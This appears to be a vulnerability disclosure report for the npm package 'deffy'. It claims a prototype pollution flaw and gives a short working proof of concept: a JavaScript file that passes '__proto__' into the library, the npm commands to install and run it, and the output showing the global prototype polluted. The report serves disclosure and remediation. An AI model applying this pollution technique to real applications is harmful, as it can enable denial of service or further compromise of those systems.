## :writing_hand: Description

`deffy` is a small and fast library to set default values. This package is vulnerable to `Prototype Pollution`.

## :male_detective: Proof of Concept

1. Create the following PoC file:
```javascript
// poc.js
const deffy = require('deffy')
const obj = {}
console.log('Before: ' + {}.polluted)
deffy(obj['__proto__'], {}).polluted = 'Prototype Polluted!'
console.log('After: ' + {}.polluted)
```
2. Execute the following commands in the terminal:
```bash
npm i deffy # install vulnerable package
node poc.js # run the PoC
```
3. Check the output:
```
Before: undefined
After: Prototype Polluted!
```

## :boom: Impact

`Prototype Pollution` leads to Information Disclosure/DoS/RCE.